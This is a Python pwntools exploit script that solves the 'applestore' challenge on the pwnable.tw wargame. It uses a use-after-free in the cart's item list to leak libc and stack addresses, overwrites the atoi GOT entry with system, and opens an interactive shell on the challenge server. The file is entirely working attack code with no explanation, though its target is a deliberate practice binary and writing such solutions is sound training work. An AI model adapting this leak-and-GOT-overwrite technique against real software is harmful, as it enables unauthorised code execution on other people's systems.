#!/usr/bin/python3
from pwn import *

PATH = "./applestore_patched"
HOST, PORT = "chall.pwnable.tw", 10104
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '57']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

def build_gs():
    return f'''
        b*0x08048C0B
        c
    '''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def GDB(gs):
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

p = conn()
#GDB()

def choice(x):
    sa(b"> ", x)

def add2(num, x=b'2'):
    choice(x)
    sna(b"Device Number> ", num)

def delete3(data, x=b'3'):
    choice(x)
    sa(b"Item Number> ", data)

def cart4(data=b'y', x=b'4'):
    choice(x)
    sa(b"(y/n) >", data)

def checkout5(data=b'y', x=b'5'):
    choice(x)
    sa(b"(y/n) >", data)


for i in range(16): add2(1)
for i in range(10): add2(4)

checkout5()

#libc
payload = b"27"
payload += p32(exe.got.puts) + b"B"*4 + p32(exe.bss(400)) + b"\0"*4
delete3(payload)

p.recvuntil(b"Remove 27:")
libc_leak = info(u32(p.recv(4)), "libc_leak")
libc.address = info(libc_leak - libc.sym.puts, "libc.address")

#stack
payload = b"27"
payload += p32(libc.sym.environ) + b"B"*4 + p32(exe.bss(400)) + b"\0"*4
delete3(payload)

p.recvuntil(b"Remove 27:")
stack_environ = info(u32(p.recv(4)), "stack_environ")
stack = info(stack_environ - 0x124, "stack")
ebp = info(stack_environ - 0x104, "ebp")

GDB(build_gs())
#shell
payload = b"27"
payload += p32(libc.sym.system) + p32(libc.sym.system) + p32(exe.got.atoi+0x22) + p32(ebp-8) 
delete3(payload)

choice(p32(libc.sym.system) + b";sh\0")

p.interactive()
